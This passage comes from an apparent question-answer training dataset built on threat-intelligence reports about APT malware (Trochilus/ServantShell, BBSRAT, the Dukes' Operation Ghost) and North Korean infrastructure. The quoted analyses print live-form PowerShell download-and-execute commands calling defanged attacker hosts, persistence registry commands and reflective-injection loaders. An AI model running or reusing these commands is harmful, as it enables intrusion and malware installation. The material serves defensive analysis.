interest\t relate to the local filepath on the system that\t was used to create the LNK shortcut\t file.\nSystem.ItemFolderPathDisplayNarrow and System.ParsingPath both reveal the presence of a\t Dropbox folder, and an Admin subfolder that\t contains another folder named UNDP. Using cloud storage facilities appears to be a\t known tactic of this group of actors, as they were observed utilizing Google Drive as described in \"Targeted Attacks on an Environmental NGO\" by CitizenLab. To our\nknowledge, these are the first\t signs that\t Dropbox may also have been used.\nThe powershell is as follows (brackets added to any malicious contents to prevent\t accidental clicks):\n%windir%\\System32\\cmd.exe /c mode con cols=15 lines=1 & powershell (new-object System.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/note.exe','%TEMP%\\note.exe'); Start-Process '%TEMP%\\note.exe'\nThe shortcut\t uses\t a\t command prompt to run PowerShell to invoke a\t System.Net.WebClient\t class to use the DownloadFile method to get\t note.exe from target\t site, store it\t in\t%TEMP% then run the file.\t This\tpowershell\t basically performs a\t typical \"download and execute\" function of the file located at http://www.oma.org[.]tw/setup/note.exe.\nThe www.oma.org[.]tw site is the \"Occupational Medicine Association in R.O.C.\". This site is or was insecure, as it\t had been compromised and defaced several times by apparently unrelated actors. The malware mentioned herein has since been removed.\nFigure 5: Setup directory containing two malware\nThe payload of the first\t downloader, Note.exe also uses PowerShell to download and execute http://down.360safe.com/inst.exe, which is the 360Total Security (Qihoo 360) anti-malware app.\tPowerShell also downloads and executes the file Setup.exe from the same staging directory on www.oma.org[.]tw/setup/.\nNote.exe creates a\t persistence mechanism by creating a\t file called StartON.bat which is then added to the Windows registry.\tThe relevant\t code is as follows:\nstart /min powershell (new-object System.Net.WebClient).DownloadFile('http://down.360safe[.]com/inst.exe', 'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process -Wait -FilePath C:\\\\ProgramData\\\\ChromeDel.exe\necho start /min powershell (new-object\nSystem.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/Setup.exe', 'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process 'C:\\\\ProgramData\\\\ChromeDel.exe'>C:\\\\ProgramData\\\\StartON.bat\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v StartON /t reg_sz /d C:\\\\ProgramData\\\\StartON.bat /f\nSetup.exe executes and drops two files: 'data.dat' and 'shell.dll' into the WEventsCache folder. Data.dat\t appears to be encrypted, and shell.dll attempts to pose as a\t binary associated with the UltraEdit\t application. Shell.dll appears to be a\t helper application known to its developers as Servant\t Shell. Based on review of the\ncode of the Trochilus RAT discovered by ASERT, shell.dll is a\t file \tgenerated when the RAT is compiled.\nA YARA rule for discovering additional samples of ServantShell was created.\n// servantshell.yara 10/26/15\n// Arbor Networks ASERT Nov 2015\nrule servantshell {\nstrings:\n$string1 = \"SelfDestruction.cpp\"\n$string2 = \"SvtShell.cpp\"\n$string3 = \"InitServant\"\n$string4 = \"DeinitServant\"\n$string5 = \"CheckDT\"\ncondition: all of them\n}\nA relatively new feature of VirusTotal called RetroHunt\t was used with this YARA rule to discover other samples of this malware. The malware appears to be rare - out\t of 80 terabytes of malware stored inside VirusTotal at\t the time of search, only eight\t additional samples were discovered. One sample clearly revealed information about\t where the malware had been found in the wild. The \tlocation of a\t file analyzed by VT\ton\t9-30-2015 was found on the staging/storage server and is still present\t at\t the time of this writing.\nFigure 6: Malware archive contains six APT-level threats\nThis\t URL is hosted in an open directory where several other malware samples have been stored in the form of RAR\t files, and reveals a\t grouping of malware utilized in this and perhaps other campaigns. This site has been reported to the Myanmar CERT for incident\t response. New content\t has been added to the site as of Dec 10, 2015 (not\t reflected in the image to the left).\nThe \"Last\t modified\" field suggests that\t this webserver has been used as a\t file staging location since at\t least\t April 10 of 2015. The first\t indicators of passive DNS activity on this domain name were observed on April 10 at\t 03:20:28. While further research is required to gain a\t better understanding of the distribution system at\t play, analysis of these files can provide insight\t into the threat\t campaign(s) at\t hand.\nThe relevant\t file hashes, datestamps, and other data about\t the RAR\t files follows. An indented bullet\t means\nthat\t the prior bullet\t was an archive or installer file that\t contained the indented files. For example, in the first\t sample, Patch-update0409BAN.rar contained Setup.exe, SqmApi.dll, and plgus_res.dll. The file plgus_res.dll is an installer file that\t contains the five innermost\t files listed (starting with mcf.ep and ending with res.db). This format\t shall be used throughout\t the document. Files shall be discussed in date order, in order to get\t a\t sense of threat\t actor timelines and capabilities.\nQuestion: How did the discovery of the Trochilus RAT and its associated files (data.dat and shell.dll) contribute to the understanding of the threat actor's capabilities and tactics?",
    "output": "Answer: The discovery of the Trochilus RAT and its associated files contributed significantly to the understanding of the threat actor's capabilities and tactics. The Trochilus RAT demonstrated advanced capabilities, including encryption and the use of helper applications like Servant Shell. The presence of these files indicated that the threat actors had sophisticated methods for maintaining persistence and evading detection. The use of a YARA rule to identify additional samples of Servant Shell revealed that the malware was rare but had been found in the wild, suggesting a targeted and potentially long-running campaign. This information helps in profiling the threat actor's technical expertise and the extent of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: North Korean infrastructure\nNorth Korea's cyber infrastructure is divided into two major parts: an outward-facing Internet connection and a regime-controlled intranet. North Korea's outward-facing Internet connection is only available to select individuals and is closely monitored for any activity that is deemed anti-regime. Individuals using the outward-facing Internet connection must be authorized. In 2013, Jean H. Lee, the Associated Press bureau chief in Pyongyang, stated that foreigners visiting North Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the Kwangmyong (gwang me-young), a nationwide intranet with no access to the world outside North Korea. 57 According to Lee, Kwangmyong allows citizens \"access to the state media, information sources that are vetted by the government, and picked and pulled from the Internet and posted to their intranet site.\"58 As of May 2013, North Korea had only one \"Internet caf\u00e9.\"59 A 2003 report from the Office of the National Counterintelligence Executive stated that North Korea's \"Internet caf\u00e9\" was \"the only place in North Korea for the public to access the Internet\" and that foreigners were allowed to access the Internet from this caf\u00e9.60 Whether citizens are allowed to access the Internet from this location is unknown.\nStar Joint Venture Co. is responsible for providing North Korea's Internet access. Star Joint Venture Co. was established by the Post and Telecommunications Corporation in cooperation with Loxley\nPacific in Thailand.61 In December 2009, Star Joint Venture became responsible for North Korea's Internet address allocation. Previously, Internet access was provided by a German satellite link via Korea Computer Center Europe or via direct connections with China Netcom, which was later merged into China Unicom. 62 By October 2010, North Korea had made its first known direct connection to the Internet, hosting an outward-facing Korean Central News Agency website accessible from the global Internet. 63 However, many of North Korea's globally accessible websites are hosted in other countries. In 2001, South Korean reports indicated that North Korea had joined the International Telecommunications Satellite Organization (INTELSAT).64 As of April 2012, North Korea reportedly used the Intelsat connection, which appeared in border gateway protocol (BGP) announcements.65 Some reports referred to the Intelsat connection as North Korea's backup Internet connection, in case the China Unicom connection fails.66 A March 2013 post on the blog rdns.im showed that North Korea no longer used the Intelsat connection. In the blog post, the author noted his method for proving that The Pirate Bay was not hosted in North Korea. While his analysis of The Pirate Bay's hosting is irrelevant to our research, he did detail that 175.45.177.0/24 always routes through AS4837, and AS131279. AS131279 is Star-KP, North Korea's Star Joint Venture Company, and AS4837 is China Unicom. The author concluded that \"all [traffic] is ONLY routed through China Unicom and NOT through Intelsat.\"67 In February 2014, North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial Zone, a jointly operated industrial complex just north of the border. However, this would likely require a major electrical and network infrastructure expansion.68\n53 http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy\n54 http://www.un.org/News/Press/docs/2013/sc10934.doc.htm\n55 http://www.ncnk.org/resources/briefing-papers/all-briefing-papers/an-overview-of-south-korea2019s-dprk-policy\n56 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n57 http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2\n58 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n59 http://www.washingtonpost.com/blogs/worldviews/wp/2013/01/29/north-koreans-shouldnt-count-on-using-the-new-google-maps/\n60 http://www.ncix.gov/publications/archives/docs/NORTH_KOREA_AND_FOREIGN_IT.pdf\nNorth Korea's electrical grid cannot support a large technological infrastructure.69 Electrical power is reported to be unreliable and sporadic, with many citizens only receiving a few hours of electricity per day.70\n61 http://www.northkoreatech.org/2011/05/19/more-details-on-star-joint-venture/\n62 http://www.computerworld.com/s/article/9177968/North_Korea_moves_quietly_onto_the_Internet?taxonomyId=18&pageNumber=2\n63 http://www.northkoreatech.org/2010/10/09/the-new-face-of-kcna/\n64 http://webcache.googleusercontent.com/search?q=cache:http://english.chosun.com/site/data/html_dir/2001/05/29/2001052961197.html\n65 http://www.northkoreatech.org/2012/04/08/dprk-gets-second-link-to-internet/\n66 http://www.computerworld.com/s/article/9237652/North_Korea_39_s_Internet_returns_after_36_hour_outage\n67 https://rdns.im/the-pirate-bay-north-korean-hosting-no-its-fake-p2\n68 http://www.northkoreatech.org/2014/02/10/internet-coming-to-kaesong-industrial-zone/\n69 http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/\n70 http://www.usnews.com/news/blogs/rick-newman/2013/04/12/heres-how-lousy-life-is-in-north-korea\nThe photo above (Figure 3), from the International Space Station, shows North Korea's sparse power grid, in comparison with surrounding nations.71 We have highlighted North Korea in red.\nKoryolink, the country's only cellular phone network,72 is tightly controlled by the regime.73 Cell phone data plans are not available to most users. Most cellular phones cannot access the Internet and can only make domestic calls.74 According to a 2013 report, North Korea has a 3G data network for cellular phones. Visiting reporter Jean H. Lee purportedly used this 3G network to post to both Twitter and Instagram. However, citizens are not generally allowed to use the 3G network.75\nEmail is also regulated by the regime. The first email provider in North Korea was Silibank. Silibank has servers in Pyongyong and Shenyang and is a joint venture with China. The North Korean Silibank homepage is silibank.net, and the Chinese homepage is silibank.com. In order to use the email service, users had to initially register, provide personal information, and pay a registration fee and monthly service fees.76 This registration information was current as of 2001. However, it is unknown whether the same process still applies.\nWHOIS records for silibank.net show that the site was registered anonymously via a Japanese registrar. This information can be found in at the end of this paper.\n71 http://www.citylab.com/work/2014/02/north-korea-night-looks-big-black-hole/8484/\n72 http://www.northkoreatech.org/2014/06/24/chinese-shops-offer-cheap-cellphones-to-north-koreans/\n73 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf&sa=D&sntz=1&usg=AFrqEzfhmQPPTuRKlcewmT2M5Oj7Xmg93Q>)http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf\n74 (<http://www.google.com/url?q=http%3A%2F%2Fwww.defense.gov%2Fpubs%2FNorth_Korea_Military_Power_Report_2013-2014.pdf&sa=D&sntz=1&usg=AFrqEzefeAB_L1WH_8cmtox2f9Se3GMojQ>)http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf\n75 http://www.austinchronicle.com/daily/sxsw/2013-03-11/social-media-in-north-korea/\n76 http://edition.cnn.com/2001/TECH/internet/11/07/north.korea.email.idg/index.html\nKorea Computer Center (KCC) is North Korea's leading government research center for information technology. KCC has eleven regional information centers and eight development and production centers. Other countries with KCC branch offices include China, Syria, Germany, and United Arab Emirates. KCC has a vested interest in Linux research and is responsible for the development of North Korea's national operating system, Red Star OS, which is discussed in more detail below. KCC's other projects have included a proprietary search engine, a document writer, a game called Jang-Gi, the Kwangmyong intranet, a food study program, a Korean input method editor, a pen-based English-Korean and Korean-English translator, Korean voice recognition software, a video conferencing system, a distance education system, SilverStar Paduk software, HMS Player77 , and the Samjiyon tablet. 78 In addition to research and development, KCC also monitors websites of foreign government and business entities and conducts technical reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and technologies. KCC has also been involved in clandestine information and cyber operations, serving as a command center.79\nNorth Korea's proprietary operating system is Red Star OS. The development of this Linux-based operating system started in 2002. Red Star OS is only offered in the Korean language and features proprietary software including Naenara (a Firefox-based browser), as well as a text editor, email client, audio and video players, and games. 80 Red Star OS's keyboard layouts include Korean, English, Russian, Chinese, and Japanese. Regime ideals extend to Red Star OS. The readme file, which goes with the installation disc, reportedly includes a quote from Kim Jong-Il regarding the importance of North Korea having its own Linux-based operating system that is compatible with Korean traditions. While prior versions of Red Star were KDE-based, version 3.0 mimics Apple's OS X.81 82 This could indicate the regime leader Kim Jong Un's preference for the OS X environment, as Kim reportedly uses an iMac.83 Citizens do not need permission to obtain Red Star OS. However, the purchase of computers is heavily regulated.84 The OS's design suggests it was developed with means for the regime to monitor user activity.85\n\nQuestion: What is the role of Koryolink in North Korea's telecommunications infrastructure, and how is it regulated?\n\nAnswer:",
    "output": "Koryolink is North Korea's only cellular phone network and is tightly controlled by the regime. Most cellular phones cannot access the Internet and can only make domestic calls. Although North Korea has a 3G data network, it is not generally available to citizens. Visiting reporters have used the 3G network to post on social media platforms like Twitter and Instagram, but this access is not extended to the general population. Email services are also regulated, with the first email provider being Silibank, which required users to register, provide personal information, and pay fees.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: BBSRAT Malware Analysis\nDeployment Technique #1\nBBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated filename is 10\u00ad16 uppercase alphabetic characters, and ends with a '.TMP' file extension. The dropper will continue to write an embedded cab file in this location.\nThe malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:\n%ALLUSERSPROFILE%\\SSONSVR\n%ALLUSERSPROFILE%\\Application Data\\SSONSVR\nUsing the built\u00adin provided by Microsoft Windows, the dropper executes the following command, which will\nexpand the CAB file and write the results to the provided directory: expand.exe \"%TEMP%\\[temp_file]\" Destination \"[chosen_path]\\SSONSVR\" This results in the following three files being written to the SSONSVR directory: aclmain.sdb pnipcn.dll ssonsvr.exe\nThe 'ssonsvr.exe' file is a legitimate Citrix executable that will be used to (<https://attack.mitre.org/wiki/DLL_side-loading>)sideload the malicious 'pnipcn.dll' file. The 'aclmain.sdb' file contains code that will eventually be loaded by the 'pnipcn.dll' file.\nThe malware finally executes 'ssonsvr.exe' via a call to (<https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx>)ShellExecuteW.\nWhen 'ssonsvr.exe' is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:\n%SystemRoot%\\System32\\msiexec.exe\nIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the 'aclmain.sdb' file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.\nIn order to ensure persistence, the following registry key is written on the victim's machine:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe : [path_to_ssonsvr.exe]\nDeployment Technique #2\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the (<https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1>)Invoke\u00adReflectivePEInjection.ps1 script from the PowerSploit framework.\nWhen the downloader executes, it will first decrypt the following two strings using a 5\u00adbyte XOR key of \"\\x01\\x02\\x03\\x04\\x05\": \"powershell \u00adexec bypass \u00adc IEX (New\u00adObject Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke\u00ad\nReflectivePEInjection \u00adPEUrl http://testzake[.]com/s.exe\"\n\"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell \u00adexec bypass \u00adc IEX (New\u00adObject\nNet.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke\u00adReflectivePEInjection \u00adPEUrl http://testzake[.]com/s.exe\" These strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to run on 64\u00adbit versions of Microsoft Windows. The commands in question will download an executable file and run it within the context of the powershell process.\nWhen the above commands are executed, the downloader will initially download the 'IR.ps1' powershell script from the specified URL:\nThis Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The malware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a copy of the BBSRAT malware family.\nThe downloader proceeds to drop either a 32\u00adbit or 64\u00adbit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of the following locations:\n%SYSTEMROOT%\\web\\srvcl32.dll\n%APPDATA%\\web\\srvcl32.dll\nAdditionally, the following registry keys are set depending on the system's CPU architecture:\nHKU\\Software\\Classes\\CLSID\\{42aedc87\u00ad2188\u00ad41fd\u00adb9a3\u00ad0c966feabec1}\\InprocServer32\\ThreadingModel \u2013 \"Both\"\nHKU\\Software\\Classes\\CLSID\\{42aedc87\u00ad2188\u00ad41fd\u00adb9a3\u00ad0c966feabec1}\\InprocServer32\\Default \u2013 [path_to_srvcl32.dll]\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB\u00adAA52\u00ad4C3A\u00adAB32\u00ad85FFC23AF9C1}\\InprocServer32\\ThreadingModel \u2013 \"Both\" HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB\u00adAA52\u00ad4C3A\u00adAB32\u00ad85FFC23AF9C1}\\InprocServer32\\Default \u2013 [path_to_srvcl32.dll]\nThe COM object for {42aedc87\u00ad2188\u00ad41fd\u00adb9a3\u00ad0c966feabec1} is specific to 'MruPidlList', while the COM object for {F3130CDB\u00adAA52\u00ad4C3A\u00adAB32\u00ad85FFC23AF9C1} is specific to 'Microsoft WBEM New Event Subsystem'. This ensures that the DLL specified will load when Microsoft Windows starts. It is a technique that was used by the (<https://nakedsecurity.sophos.com/2012/06/06/zeroaccess-rootkit-usermode/>)ZeroAccess rootkit when it initially surfaced.\nBBSRAT Execution\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime: ntdll.dll kernel32.dll user32.dll advapi32.dll gdi32.dll ws2_32.dll shell32.dll psapi.dll\nSecur32.dll\nWtsApi32.dll\nNetapi32.dll\nVersion.dll\nCrypt32.dll\nWininet.dll\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given time:\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:\nGlobal\\GlobalAcProtectMutex\nThe malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication. This includes a series of HTTP or HTTPS requests, such as the following:\nGET /bbs/1/forum.php?sid=1 HTTP/1.1\nCookie: A46A8AA9\u00adD7D6\u00ad43FB\u00ad959DC96E\nContent\u00adLength:\nUser\u00adAgent: Mozilla/4.0 (compatible; Windows NT 5.1)\nConnection: Keep\u00adAlive\nHost: transactiona[.]com\nCache\u00adControl: no\u00adcache\nAccept: */*\nContent\u00adType:\nIn the above example, the '1' used both in the URI and the sid GET parameter is a global incremental counter. Every subsequent request made by BBSRAT increments this counter by one. Additionally, all variants of BBSRAT we have found use the same URL\n4/3/2016 BBSRAT Attacks Targeting Russian Organizations Linked to Roaming Tiger - Palo Alto Networks BlogPalo Alto Networks Blog\nfor command and control (C2) communication.\nWhen first executed, the malware will exfiltrate data about the victim's machine via a POST request to the '/bbs/[counter]/forum.php?sid=[counter]' URL. All network data sent via POST requests uses a custom binary structure, as defined as the following:\nThe compressed_data field is compressed using the common ZLIB compression algorithm. Additionally, in the event data is being sent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:\nThe following data structure holds the victim's information that is uploaded by BBSRAT:\nBBSRAT accepts many possible commands that the C2 server can provide. These commands are sent as a response to the GET beacons that are continually requested via either HTTP or HTTPS. The following commands and sub\u00adcommands have been identified:\nPlease refer to the appendix for a full list of identified BBSRAT samples and their associated C2 servers.\nBig Headline: Conclusion\nAs in many of the previous articles regarding espionage\u00admotivated adversaries and possible nation\u00adstate campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge. Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook. We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks.\nAnswer this question: How does BBSRAT achieve persistence on a compromised system, and what specific techniques does it employ to ensure it remains active?",
    "output": "BBSRAT achieves persistence on a compromised system by writing a registry key that ensures the malware executes upon system startup. Specifically, it writes the following registry key: HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ssonsvr.exe : [path_to_ssonsvr.exe]. Additionally, in Deployment Technique #2, it sets registry keys related to COM objects to ensure the malicious DLL loads when Windows starts. For example, it sets keys under HKU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32 and HKLM\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\\\InprocServer32, specifying the path to the malicious DLL.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. EXECUTIVE SUMMARY\nIt is exceptionally rare for a well-documented threat actor, previously implicated in very high-profile attacks, to stay completely under the radar for several years. Yet, in the last three years that is what APT group the Dukes (aka APT29 and Cozy Bear) has done. Despite being well known as one of the groups to hack the Democratic National Committee in the run-up to the 2016 US election, the Dukes has received little subsequent attention. The last documented campaign attributed to them is a phishing campaign against  the Norwegian government that dates back to January 2017.\nIn this white paper, we describe how we uncovered that the Dukes had been running successful espionage campaigns while avoiding public scrutiny, thanks to stealthy communication techniques and retooling.  We call these newly uncovered Dukes campaigns, collectively, Operation Ghost, and describe how the group  has been busy compromising government targets, including three European Ministries of Foreign Affairs and the Washington DC embassy of a European Union country, all without drawing attention to their activities.\nMedium Headline: Key points in this white paper:\nThe Dukes never stopped their espionage activities.\n\u2022 Operation Ghost likely started in 2013.\n\u2022 The last known activity linked to Operation Ghost occurred in June 2019.\n\u2022 ESET researchers identified at least three victims: all European Ministries of Foreign Affairs including  the Washington DC embassy of a European Union country.\n\u2022 The Dukes have used four new malware families in this campaign: PolyglotDuke, RegDuke, FatDuke  and LiteDuke.\n\u2022 Operation Ghost uses a previously documented Dukes backdoor: MiniDuke.\n\u2022 The Dukes have leveraged online services such as Twitter, Imgur and Reddit to act as primary Command and Control (C&C) channels for their first-stage malware.\n\u2022 The Dukes have used very stealthy techniques such as steganography to hide communications between compromised machines and their C&C servers.\nFor any inquiries related to this white paper, contact us at (<mailto:threatintel@eset.com>)threatintel@eset com.\nMedium Headline: 2.1 Timeline\nEven though the group's activities are believed to have started in 2008, the first public report was released  in 2013 with the analysis of MiniDuke by Kaspersky (<>)[3]. Over the next two years, multiple reports dissected the Dukes' arsenal, including a comprehensive summary by F-Secure of the group's activities from 2008  to 2015 (<>)[4].\nOne of the most recent attacks that we can link to the Dukes is the January 2017 phishing attempt against the Ministry of Foreign Affairs, the Labour Party and the Armed Forces of Norway (<>)[5]. Since then, most security experts have believed the Dukes went dark or completely changed their arsenal to pursue their mission.\nIn November 2018, a strange phishing campaign hit dozens of different organizations in the United States, including government agencies, and think tanks. The attack leveraged a malicious Windows shortcut  (a .lnk file) that bore similarities to a malicious shortcut used by the Dukes in 2016. However, that earlier sample was available in a public malware repository for many years, allowing another actor to easily conduct a false-flag operation. In addition, there is no evidence that any custom malware used only by the Dukes was employed during this attack. From FireEye's detailed analysis of the attack (<>)[6], it was not possible  to make a high-confidence attribution to this threat actor.\nMedium Headline: 2.2 Targets\nOver the years, it has been possible to draw the big picture of the Dukes main targets. The group is primarily interested in spying on governments either in the West or in former USSR countries. Besides governments, the group has also targeted various organizations linked to NATO, think tanks, and political parties.\nThis targeting suggests a clear interest in collecting information allowing a better understanding of future international political decisions, which would seem of most interest to a government. Unlike other groups such as GreyEnergy (<>)[7] and TeleBots (<>)[8], it is important to note that we have never seen the Dukes engaged in cybersabotage operations.\nSurprisingly though, the group also has conducted spying operations outside its main focus. In 2013,  Kaspersky researchers found evidence that part of the Dukes toolset had been used against drug dealers  in Russia (<>)[9]. This may suggest that this toolset is not only used for collecting foreign intelligence but also  for conducting LE investigations of criminal activities.\nMedium Headline: 2.3 Tools and tactics\nThe Dukes group is known to be a major player in the espionage scene. It is associated with a large  toolset with more than ten different malware families written in C/C++ (<>)[10], PowerShell (<>)[11], .NET (<>)[12] and Python (<>)[13]. It has also adopted living-off-the-land tactics, misusing standard IT tools such as PsExec and Windows Management Instrumentation (WMI).\nAs mentioned before, we invite our readers to read the F-Secure summary (<>)[4] for an analysis of the earlier malware platforms used by this threat actor.\nSmall Headline: Delivery\nThe group's main initial tactic to breach a network is to send spearphishing emails that contain a link  or an attachment. Figure 2 is an example of one such campaign, which occurred at the end of 2016. In order to increase the attackers' chances, it is designed to be a subject of particular interest of the recipient. This  is different from mass-spreading malicious email campaigns where the same email is sent to hundreds  or thousands of people by crimeware actors.\nSource:\nWhen targets click on these malicious links or attachments, a .zip archive that contains a malicious, macro-enabled Word document and a decoy (as shown in (<>)Figure 3) will be downloaded. If victims then  open the malicious document and enable the macro, it will then install the PowerDuke backdoor (<>)[14].  In other cases, malicious Windows shortcuts (.lnk files) have been used instead of Word documents  with malicious macros.\nHowever, this is not the only method used by the Dukes to gain initial access. In 2014, the Dukes started using two mass-spreading methods to deliver the OnionDuke implant:\n\u2022 Trojanized pirated applications downloaded via BitTorrent\n\u2022 A malicious TOR exit node to trojanize downloaded applications on the fly (<>)[15] (<>)[16]\nOnionDuke has some capabilities outside the standard espionage features, such as a Denial of Service (DoS) module, but we have not observed them used in the wild.\nFinally, the Dukes are also known for using multiple implants to compromise a target. It is very common  to see an implant delivering another one to regain control of a system.\nSmall Headline: Command and Control (C&C)\nThe Dukes have employed several interesting tactics to hide the communications between the implants  and their C&C servers, including the use of social media platforms and steganography.\nMiniDuke (<>)[17] and HammerDuke (<>)[12] leveraged Twitter to host their C&C URLs. In addition, they use  a Domain Generation Algorithm (DGA) to generate new Twitter handles. Each time the malware generates a new handle, it fetches the Twitter page corresponding to that handle and searches the page for a specific pattern, which is the encrypted C&C URL.\nIn CloudDuke (<>)[18], the operators leveraged cloud storage services such as OneDrive as their C&C channels. They were not the first group to use this technique, but it is generally effective for the attackers  as it is harder for defenders to spot hostile connections to legitimate cloud storage services than  to other \"suspicious\" or low-reputation URLs.\nMoreover, the Dukes like to use (<https://www.virusradar.com/en/glossary/steganography>)steganography to hide data, such as additional payloads, in pictures.  It allows them to blend into typical network traffic by transferring valid images while its true purpose  is to allow the backdoor to communicate with the C&C server. This technique has been described  in Volexity's PowerDuke blogpost (<>)[14].\nBig Headline: 3. OPERATION GHOST\nAfter 2017, it was not clear how the Dukes evolved. Did they totally stop their activities? Did they fully re-write their tools and change their tradecraft?\nWe spent months apparently chasing a ghost then, a few months ago, we were able to attribute several distinct intrusions to the Dukes. During the analysis of those intrusions, we uncovered several new malware families: PolyglotDuke, RegDuke and FatDuke. We call the Dukes' campaigns using these newly discovered tools Operation Ghost\nMedium Headline: 3.1 Targets and timeline\nWe believe Operation Ghost started in 2013 and was still ongoing as of this writing. Our research shows  that the Ministry of Foreign Affairs in at least three different countries in Europe are affected by this campaign. We also have discovered an infiltration by the Dukes at the Washington, DC embassy of a European Union country.\nThis targeting is not surprising, and it shows that the Dukes are still active in high-profile organizations.  We also believe that more organizations around the world might be affected but due to the use of unique C&C infrastructure for each victim, we were not able to identify other targets.\nOne of the first traces of this campaign is to be found on Reddit in July 2014. (<>)Figure 4 shows a message posted by one of the Dukes' operators. The strange string using an unusual charset is the encoded URL  of a C&C server and is used by PolyglotDuke as described in (<>)section 4 2.\n\nHow did the Dukes leverage social media platforms like Twitter for their C&C operations?",
    "output": "The Dukes leveraged Twitter to host their C&C URLs, particularly in the MiniDuke and HammerDuke malware. They employed a Domain Generation Algorithm (DGA) to create new Twitter handles. Each time the malware generated a new handle, it fetched the corresponding Twitter page and searched for a specific pattern, which contained the encrypted C&C URL. This method allowed the Dukes to dynamically update their C&C infrastructure and maintain control over compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 2 Russian Cyber Strategy\nToday, how is this Clausewitzian-inspired Russian strategic imagination being applied to the use of cyber power? The answer can be found by first exploring the strategic challenge they apparently believe they face: the NATO alliance. NATO is based on the concept of collective defence that enhances its strategy of deterrence. Through formal agreements and long-standing and extensive collaboration, NATO sends a strong signal that member states will stand together in the face of threats to collectively deter aggression against its members. The objective of this deterrent policy is to preserve the peace. This is a key observation. The goal of NATO's deterrent strategy is to reduce or even eliminate the possibility of war by ensuring that aggressors understand ex ante that an attack against one of its members is an attack against the entire Alliance. Especially today, NATO primarily exists to prevent war, not to develop enhanced strategies or capabilities to prosecute war or to wield forces to achieve ancillary objectives. In a sense, NATO exists to preserve the peace and to make sure that changes to the status quo in Europe occur through political processes that lead to the spread of democracy, the rule of law, and adherence to international norms. The raison d'\u00eatre of NATO is to preserve the peace; the purpose behind its strategy is to deter war.\nRussia opted to pick a course of action not to defeat NATO, but NATO's strategy.\nTo achieve its objective \u2013 rapid change of the European status quo to better fit their Russia-centric, not democratically-cantered, interests and preferences \u2013 Russia opted to pick a course of action not to defeat NATO, but to defeat NATO's strategy. By presenting the Western alliance with a fait accompli through actions that produce minimal death and destruction, Russia attempted to shift the onus of escalation onto NATO, thereby inflicting a strategic defeat on the Alliance at the outset of hostilities or even in the event of non-democratic changes to the status quo. Russia is banking on the hope that NATO will either be incapable or unwilling to transform this strategic defeat into active conventional combat, which would further undermine NATO's goal of preserving the peace. In effect, the Russians seem to have realised that by defeating NATO's strategy at the outset of a confrontation, they can actually alter political perceptions within the Alliance in a way that suits their objectives. Put somewhat differently, the 